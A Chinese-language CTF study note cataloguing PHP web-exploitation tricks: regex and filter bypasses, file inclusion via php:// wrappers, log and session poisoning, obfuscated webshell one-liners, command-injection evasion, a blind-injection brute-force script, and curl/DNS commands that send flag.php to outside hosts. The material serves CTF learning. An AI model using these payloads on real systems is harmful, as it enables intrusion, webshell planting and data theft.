---
title: 
date: 2022-05-29 16:58:50
categories:
- security
tags:
- php
toc: true
---
**摘要：本文总结了ctf中涉及php的tricks**
<!-- more -->
---
# 搭建环境
[kali](http://www.javashuo.com/article/p-cwpcukmt-ek.html)
# 一.伪随机数
mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。
提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。并且如果设置了 seed参数 生成的随机数就是伪随机数，即每次生成的随机数是一样的
mt_rand()的值与`调用次数、操作系统、php版本(浏览器插件查看)`有关
若不知道seed，可用[工具](https://www.openwall.com/php_mt_seed/)或自己遍历种子与随机数比较
```bash
在linux下面make之后运行脚本添加随机数 time ./php_mt_seed 183607393 #一定加time否则很慢
或 time ./php_mt_seed 1328851649 1328851649 0 2147483647 1423851145 #第一次范围，第二次缺省，第三次调用输出的随机数为1423851145
```
# 二、函数
## intval
1.如果第二个参数是 0，通过检测 var 的格式来决定使用的进制：
如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，如果字符串以 "0" 开始，使用 8 进制(octal)；否则，使用 10 进制 (decimal)。注意数字前可以加'+'
2.intval() 不能用于 object和数组，否则会产生 E_NOTICE 错误并返回 1（通常配合preg_match来使用）
3.小数舍去
```php
intval('1e1000')=1 //英文字母后的数字都省略
intval(665.999999)==665 //而665.9999999==666成立
intval(array())=0,intval(array(2,3,4))=1,intval(array('aa','bb','cc'))=1 //非空的数组会返回1,注意在url输入[]来表示数组，array会被认作字符串
intval('0x3A')=0,intval(0x3A)=58,intval('0x3A',0)=58 //十六进制,八进制开头是0
```
## preg_match()
返回的匹配次数，不匹配为0，匹配成功1次即为1，然后停止搜索
preg_match_all()不同于此，它会一直搜索直到到达结尾
### 正则表达式
\056\160\150\x70为16进制和8进制ascii代码
"\\|"就是表示"|"
|属于正则中的元字符，表示或的意思，因此表示'|'字符本身必须转义
\本身具有转义作用，\\表示\ ,'\\|'传给正则就是"\|",表示对|进行转义，不作为特殊字符使用
### 绕过方法：
1.数组绕过，如果发生错误(比如传进参数是数组),两者返回 FALSE。常配合file_put_contents的数组漏洞使用
![20220530161635](https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png)
2.多行匹配/m
看到/i可想到%0a绕过
```php
/^AB/会匹配"ABn e"中的A，但是不会匹配"ab AB"中的A //匹配开始行
[^a-zA-Z0-9]表示“找到一个非字母也非数字的字符”。 //取否

/i //忽略大小写
/g //全文查找出现的所有匹配字符
/m //多行查找,可通过%0a绕过,详细参见https://wenku.baidu.com/view/a897bc29f22d2af90242a8956bec0975f465a4c0.html

^php //开头匹配 如phpaaa
php$ //结尾匹配 如aaaphp
^php$ //只有php能匹配
```
3.长度溢出
```php
echo str_repeat('very', '250000').'36Dctfshow';
```
4.命名空间绕过
php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法
如限制函数开头不能有字母和数字，可用\phpinfo()绕过

5.无字母数字
a.eval php7以上
返回字符串中代码的返回值
原理：eval("('phpinfo')();");
```php
//限制v1,v2为数字，v3无数字和字母，参见p牛博客
eval("return $v1$v3$v2;");
//1-phpinfo()-1;
//1^('system')('cat f*')^1;//高版本
```
* 位运算
可用的运算符:&,|,~,^
```c
//v2=^(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa^%96%89)^ //v2=|(~%8c%86%8c%8b%9a%92)(~%93%8c)|
//c=('``````'|'%13%19%13%14%05%0d')('``'|'%0c%13')
```
![20220608232028](https://s2.loli.net/2022/06/08/XjDzQf61uVPAaHe.png)
[生成脚本](https://blog.csdn.net/miuzzx/article/details/108569080)
* 自增 'Y'=>'Z'=>'AA'
b.system
* shell下可以利用.来执行任意脚本(任意后缀名如txt)，如当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令，且不需要file有x权限
Linux文件名支持用glob通配符代替

发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。
随便向一个php里post都可以，它会被保存在tmp那个目录(任何程序都可写)。每次执行完脚本会清空tmp
执行. /tmp/phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符,/tmp/phpXXXXXX可以表示为/*/?????????或/???/?????????
但能够匹配上/???/?????????这个通配符的文件有很多，若在执行第一个匹配上的文件的时候出现错误，会导致整个流程停止，根本不会执行到我们上传的文件。
但所有文件名都是小写，只有PHP生成的临时文件包含大写字母。可以利用[@-[]来表示大写字母，替代要匹配的那个?
当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。(repeater多点几次，多生成些随机文件)

* `$(command)` 返回command这条命令的stdout（可嵌套）
```bash
$(()) #0
~$(()) #~0
$((~$(()))) #-1
$(($((~$(())))+$((~$(()))))) #-2
$((~$(($((~$(())))+$((~$(()))))))) #2
```

6.下划线限制绕过
PHP接收参数时，发现表单名中如果是 句号(.)或者空格( )，会被转换成下划线(_) 
解决方法：
```php
A[W.C //A_W.C
```
## ereg(),eregi()
绕过：ereg()函数存在NULL截断漏洞，当传入的字符串包含%00时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数
注意在PHP7已废用
```php
eregi(正则表达式，匹配字符串)//不区分大小写
如ereg ("^[a-zA-Z0-9]+$",$_GET['password'])限制了password的形式，只能是一个或者多个数字、大小写字母，可以使用%00截断正则匹配。password=1e8%00*-*
如eregi("111".substr($b,0,1),"1114")可令$b=.或$b=%00
```

## highlight_file
用绝对路径和相对路径../和./绕过，得到文件包含
`$_SERVER`参数会自动加上HTTP_
文件上传时可以用show_source(__FILE__);看上传成功没有

## file_put_contents(文件名，内容)
1.函数第二个允许传入数组，将被连接为字符串再写入
![20220530162849](https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png)
注意会覆盖原文件内容，有时要想好再写
2.文件名可以是index.php


## in_array()
```php
bool in_array ( 要在数组搜索的值 , 要搜索的数组, bool $strict = FALSE) //漏洞在于第三个参数可选，如不设置为true就不检测类型，是弱比较，相当于==号，如"1.php"==1
```
## is_numeric
非数值->数值：
1.可以将非数值字符串转换为16进制再进行判断
```php
1 or 1 -> 0x31206f722031
is_numeric("0x123");//php7以后为false,以前为true
```
2.在数字前加上空格，也会被is_numeric函数认为是数字
```php
trim函数会过滤空格以及\n\r\t\v\0，但不会过滤\f=>%0c
is_numeric("%0c36") //true
```
数值->非数值的绕过:
可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以；%20加在数值末尾也可以绕过
## is_file
绕过：利用函数所能处理的长度限制进行目录溢出。从而让is_file认为不是一个文件
## 回调函数
调用的函数还可以嵌套回调函数
```php
//单参数回调
call_user_func(函数,参数)//可无参数或一参数 
//可调用此文件及库文件定义好的函数(默认有hex2bin,bin2hex等字符串和16进制转换可用)
call_user_func_array(数组,函数)//第二个参数可以传入参数列表组成的数组
//数组操作 单参数
array_filter(数组,函数)//将数组中所有元素遍历并用指定函数处理过滤用的
array_map(函数,数组)//一样
register_shutdown_function(函数, $_REQUEST['pass']);
register_tick_function (函数, $_REQUEST['pass']);
filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));
filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));//php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。

//php 5.4.8+后的版本，assert函数由一个参数，增加了一个可选参数descrition =>有两个参数的回调函数
uasort(array('test', $_REQUEST['pass']),函数);
uksort(array('test', $_REQUEST['pass']),函数);
//面向对象
$arr = new ArrayObject(array('test', $_REQUEST['pass']));
$arr->uasort('assert');

array_reduce(array(1), fun, $_POST['pass']);
array_udiff(array($_POST['pass']), array(1), fun);

//三参数回调
php中，可以执行代码的函数：
一个参数：assert
两个参数：assert （php5.4.8+）
三个参数：preg_replace /e模式
mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');
preg_filter('|.*|e', $_REQUEST['pass'], '');

array_walk(array($_POST['pass'] => '|.*|e',), $_REQUEST['e'], '');//?e=preg_replace
array_walk_recursive(array($_POST['pass'] => '|.*|e',), $_REQUEST['e'], '')
```
## 无参函数
限制传输进参数的函数名必须是字母函数且不能有参数
```php
eval("return $f1($f2());");//fuzzing
```
## parse_str
```php
parse_str("name=Peter&age=43",$myArray);//Array ( [name] => Peter [age] => 43 )
```
## eval,assert
题目给了`eval("$c")`,构造`$c`的方法：
```php
1.echo/var_dump/print $flag/$GLOBALS;
2.highlight_file/show_source("flag.php");
```

![20220602121923](https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png)
## base_convert(number,frombase,tobase);
frombase和tobase介于 2 和 36 之间（包括 2 和 36）
```php
常用base_convert(37907361743,10,36); //但会转换小写和去掉特殊符号，所以常配合hex2bin等使用
```
## 魔术方法
```php
class_exists($class)//判断类是否存在,当类不存在时会调用__autoload(),尝试加载未定义的类
```
## 匿名函数
[参考](https://my.oschina.net/huyex/blog/2885273)
```php
$ctfshow('',$_GET['show']);//可以控制函数名和第二个参数
creat_function(string $agrs,string $code)
//string $agrs	声明的函数变量部分
//string $code	执行的方法代码部分
$newfunc = create_function('$fname', 'echo $fname."Zhang"')
但实际会编译成
function fT($fname) {
  echo $fname."Zhang";
}//可实现注入 id=}phpinfo();/* 一定要用多行注释
```
# 三、字符串
## strpos
strpos() 函数是区分大小写的。
返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回 false 
绕过方法：1.利用换行（%0a）或+(%2b,如果是数字)进行绕过
`if(!strpos($num, "0"))`
2.大小写
3.目录穿越
4.数组
```php
if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
}
/ctfshow/../../../../var/www/html/flag.php 
```
## str_replace
用于替换字符串中指定字符（区分大小写）
```
str_replace(要查找的值,替换的值,被搜索的字符串,可选count)
```
绕过：str_replace无法迭代过滤 ，可以通过双写绕过
## strtr
```php
strtr(string,from,to)
strtr(string,array)
$arr = array("Hello" => "Hi", "world" => "earth");
```

# 四、md5、sha1
## 弱类型比较
```php
md5('QNKCDZO') == 
'0e830400451993494058024219903391'
md5('240610708') == 
'0e462097431906509019562988736854'
```
## ===数组碰撞
md5传入数组会返回NULL
[1] !== [2] && md5([1]) === md5([2])

# 五、运算符
## and
AND运算符和&&运算符的根本区别在于它们的优先级差异，但两者都执行相同的操作。
第一个表达式，`$bool = TRUE && FALSE`; 计算结果为FALSE，因为执行了第一个&&操作，然后将结果赋值给变量`$bool`，因为&&运算符的优先级高于=的优先级。
第二个表达式，`$bool = TRUE and FALSE`; 计算结果为TRUE，因为运算符"and"的优先级低于运算符"="，因此=的右边的值TRUE被分配给`$bool`，然后"and"操作在内部执行但未分配，因此`$bool`现在保持为TRUE。

## && ||
```php
A && B || C //可不管A,B,只保证C为true
```

# 六、类
魔术方法
静态方法：不用实例化可以直接调用
调用方法：
```php
call_user_func($_POST['ctfshow']);
1.ctfshow::getFlag()
2.ctfshow[0]=ctfshow&ctfshow[1]=getFlag//过滤冒号
```

## 内置类
1.反射类
```php
eval("echo new $v1($v2());");
// v1=ReflectionClass&v2=system('cat fl36dg.txt')
//当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示。即使传入了空的括号，代码依旧可以运行
echo new ReflectionClass('class');//返回类信息
echo new ReflectionObject($student);
echo new ReflectionFunction(getcwd);//Function [ function getcwd ] { - Parameters [0] { } }

```
2.Exception类
3.FilesystemIterator类
```php
$iterator = new FilesystemIterator('.'); // 创建当前目录的迭代器,默认只显示第一个文件,需要遍历
getcwd()//获取当前工作目录
```

# 七、文件包含
常用包含/etc/passwd来查看回显
## 伪协议
?file=php://
fuzz一下所有的伪协议
```php
include($_GET["file"]);//php://input读取post的data的内容作为文件
php://filter/read=convert.base64-encode/resource=/flag
file_put_contents($v3,$str);//$str进行base64编码
$v3=php://filter/write=convert.base64-decode/resource=1.php
若base64在黑名单，可绕过：
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php

php://filter/read=convert.quoted-printable-encode/resource=flag.php
若php://在黑名单：
compress.zlib://flag.php
file:///
dict://
sftp://
ldap://
tftp://
gopher://
data:text/plain,<?php phpinfo();?> //可去掉双斜杠
data://text/plain;base64,poc
```
![20220530222004](https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png)
## 日志getshell
先在user-agent写shell，url不带参数
再包含/var/log/nginx/access.log
## 利用session对话
php中的session.upload_progress，当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session
利用PHP_SESSION_UPLOAD_PROGRESS=""把内容写入/tmp/sess_TGAO
## 利用php://filter绕开exit
```php
$content = '<?php exit; ?>';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);
php://filter/write=string.strip_tags|convert.base64-decode/resource=1.php
php://filter/write=string.rot13/resource=1.php
```
>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码
>先strip_tags绕exit，再用base64还原
# 八、变量
## 全局变量
flag In the variable 
```php
eval("var_dump($$args);");//?args=GLOBALS
```
_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll
```php
call_user_func(call_user_func(_,"get_defined_vars"));
_("get_defined_vars")=get_defined_vars
call_user_func(get_defined_vars)
```
## $_SERVER
```php
1.$_SERVER['argv']
GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])

2.$_SERVER['QUERY_STRING'];//url的?后的所有内容
```

## 变量覆盖
```php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
?F=`$F`;空格sleep 3//好像网站确实sleep了一会说明的确执行了命令
``是shell_exec()函数的缩写
先进行substr()函数截断然后去执行eval()函数,即eval("`$F`;空格")
而$F就是我们输入的`$F`;空格sleep 3
即最终效果是eval(`sleep 3`);//注意eval(``),exec,system是shell命令，而且只能输入shell命令，不会在网站显示,system成功则返回命令输出的最后一行
//解决方法
//1.oob
//2.写入文件，用>或|tee
//3.命令盲注 //.被过滤
```
# 九、命令执行
`system($c)`会有回显，只是phpstudy无法显示
```bash
#php函数
include|require
system|exec|passthru|shell_exec #exec("cat /f149_15_h3r3|tee 1");
#命令行命令
bash|sh
nc|netcat|wget|curl|ping
cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head|nl
```
已知flag在flag.php里
```php
1.注释，如`$v2=/*,$v3=*/` 
2.命令分隔符;如system($c." >/dev/null 2>&1");
还可以用&&,||,&执行前一条命令,如ls||tac
|执行后一条命令
记得特殊符号要url编码
3.过滤flag等关键字
可用通配符*?[]等代替，cat f*代替,
或eval(echo `n''l fl''ag.ph''p`);//两引号分隔在shell中执行会自动忽略
技巧:用tac而不是cat可以不用查看源代码，因破坏了php格式
4.过滤system等可用``代替，eval,``相当于把数据段""变成了代码段
5.过滤空格的代替：
print或echo`cat f*` //echo之间不用加空格
换行符：\n=>%0a //echo%0a`不可用%0a`
回车：\r=>%0d //echo%0d`不可用%0d`
水平制表符:\t=>%09 //`可用`
垂直制表符：\v=>%0b // echo%0b`不可用%0b`
特殊零字符，也可以表示NULL值:\0=>%00
换页键:\f=>%0c //echo%0c`不可用%0c`
重定向读取如`nl<fla''g.php||` //注意不支持通配符
没过滤`$`的话可用tac${IFS}flag.txt
6.参数逃逸 --有很多限制时可以试试
eval($c);//对$c做了限制
$c=eval($_GET[1]);//构造不受限的参数1
$_GET{abs};
7.过滤括号和分号
a.使用包含:c=require或include%0a$_GET[1]?>&1=php:// //过滤),(,;
//最后一句可不用分号,但这样的话必须有闭合标签才行
//eval等函数的括号可以不闭合，只需令c=phpinfo()?>
实际效果：
<?php
eval("('phpinfo')()?>");

b.使用语言结构:echo print isset unset $_GET[1]
8.c=show_source(next(array_reverse(scandir(pos(localeconv())))));//不过滤括号和分号时的通解
localeconv()//函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. =>为了拿到.
pos()/current()//函数返回数组第一个值 =>拿到.
scandir(".")//这个函数的作用是扫描当前目录
//顺序是array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(7) "flag.py" [3]=> string(9) "index.php" }
array_reverse()//数组颠倒
next()//将数组指针一项下一位
show_source()//读取函数内容
9. c=session_start();system(session_id());
PHPSESSID=ls
10.c=eval(pos(next(get_defined_vars())));//注意必须要有2个eval
post:1=phpinfo();//实现参数逃逸到POST
11.过滤引号
$_GET[a]字母是可以不加引号的
12.位运算构造绕过正则,但要在eval等能执行php代码的函数里面才能执行位运算，system不行
13.通过重命名或复制绕过文件读取(注意要有权限)
cp flag.php a.txt//再访问a.txt
14.通过phpinfo查看禁用函数，再fuzz。(参数逃逸无效，因禁用是全局的)
文件读取函数：readfile,file_get_content,highlight_file,show_source
目录搜索：var_dump(scandir('.'))
文件包含+伪协议或$flag：include,require($_GET[1]) 
执行shell命令：exec,system,shell_exec,passthru
包含后读取变量：echo $flag;var_dump(get_defined_vars()/$GLOBALS)
重命名和复制：rename,copy
15.缓冲区替换绕过：
$s = ob_get_contents();//output buffer
ob_end_clean();
echo preg_replace("/[0-9]|[a-z]/i","?",$s);
绕过方法：
中断:exit,die
16.glob协议进行目录扫描(遇到权限限制open_basedir restriction时)
c=$a="glob:///*.txt";//定义路径
if($b=opendir($a)){
    while(($file=readdir($b))!==false){//如果它不是目录
        echo "filename:".$file."\n";
    }
    closedir($b);
}
uaf脚本绕过安全目录(利用php的垃圾回收机制漏洞)(记得url编码)
17.调用其他应用如mysql来访问文件
c=try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
    foreach($dbh->query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}
    catch (PDOException $e) {echo $e->getMessage();exit(0);}
    exit(0);
18.蚁剑绕过disabled functions
19.FFI，php7.4以上才有
$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
$a='/readflag > 1.txt';//没有回显的
$ffi->system($a);//通过$ffi去调用system函数
20.环境变量取字母拼接命令
//$PATH最后一位是n：/bin
${PATH:~0}
${PATH:~A}//0和字母均代表最后一位
//$PWD最后一位是l:/var/www/html
${HOME}
${PATH:~A}${PWD:~A}${IFS}????.???//flag.php
${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}//3
${PHP_CFLAGS:3:3}//cat
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
$? //上一次执行的命令，1为不正常，0为正常
<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???#可能存在成功的机会，不断刷新
```
![20220608021618](https://s2.loli.net/2022/06/08/tnSLOwqyuvQXAl7.png)

## 命令盲注
脚本：
```py
import requests
import time
import string
str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
    #print(j)
    if key==1:
        break
    for n in str:
        payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
        url="http://5fd5973f-3879-413f-9bfc-f3913f618e5f.challenge.ctf.show/?c="+payload
        try:
            requests.get(url,timeout=(2.5,2.5))
        except:
            result=result+n
            print(result)
            break
```
## oob
```php
1.?F=`$F`;+curl -X POST -F xx=@flag.php  http://生成的域名
//xx是上传文件的name值，可随便写。flag.php就是上传的文件,前面要加@表示是文件
2.?F=`$F`;+curl  http://requestbin.net/r/1puo0jq1?p=`cat test.php` 
3.ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn
nl flag.php|awk "NR==16"|tr -cd "[a-z]"/"[0-9]"//注意前面会有行号
awk //选择行
tr //选择符合正则表达式的输出，过滤{},-等特殊符号
```
# 十、文件上传
一句话木马：
```php
eval("echo%20phpinfo();");//注意eval里一定要有引号和分号结束，以及echo不能再接引号了，否则要转义
$poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s'])//过狗一句话
```
## 后缀名绕过
1.%00截断
2.py
```py
import os
os.system('find /* |grep flag')
```
## 路径绕过
```
./ ../ /
在文件名后面加/
```
## 文件头绕过
31 31 31=>89 50 4e 47 0d 0a
## .htaccess解析绕过
```
AddType application/x-httpd-php .png
```
## 内容绕过
```php
preg_match('#\w{2,}|[678]|<\?|/#',$content);//不能出现2个及以上字母或数字|<?|/
```
1.用字符串连接符.绕过
2.可变函数绕过(注意eval函数不能用)
```
$a = 'a'.'s'.'s'.'e'.'r'.'t'
$a();
```
3.结尾的结束符?>可忽略，因为php是动态脚本
4.短标签绕过
```php
<?= ?> //所有情况可用
<? ?> //需开启短标签
<script language="PHP"> <script/>
```
5.eval,assert
6.system,wget,nc,exec,passthru,netcat,curl 
```php
curl `cat flag.php|grep "flag"`.当时创建的域名 //dnslog
```
## 文件包含绕过
有?file=upload.php的
直接访问图片是没用的。菜刀连接的url要包含?file=才行
1.文件包含不管后缀名是什么，只要含有<?php 内容即可,所以可配合图片马(包含可以解析出来)或.log
2.phar能把压缩文件解压读取，即使这个压缩文件的后缀名改了也可以。所以上传一个getshell的压缩文件，后缀名改成jpg或者其他。然后通过phar://读取
```php
1.test.php
2.压缩后改后缀名为jpg
3.include("zip://t.zip#t.php");
或include("phar://a.phar/a.php");
```
## 非预期绕过
把一句话写到访问日志里面
使用条件:post提交ctf=/etc/passwd,有回显,我们可以日志文件包含还有session包含(如果clean up开启就不行,需要条件竞争 )
```php
include($ctf);
先在User-Agent注入php代码//只有一次机会
ctf=/var/log/nginx/access.log   ctf=/var/log/apache/access.log
```
![20220607212037](https://s2.loli.net/2022/06/07/kMV7Hl6ONaWYJDU.png)
![20220607212052](https://s2.loli.net/2022/06/07/OL675yudzZkmgXa.png)

# 十一、反序列化
序列化只保留成员变量不保留函数方法，所以修改也只能修改变量
```php
O:11:"ctfShowUser":3:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxa";s:5:"isVip";b:1;}
```
1.重新构造一个同名相似类，覆盖掉一些特征
```php
public $isVip=true;
echo urlencode(serialize(new ctfShowUser));
```
# 其他


---

# 参考
1.[p神博客](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list)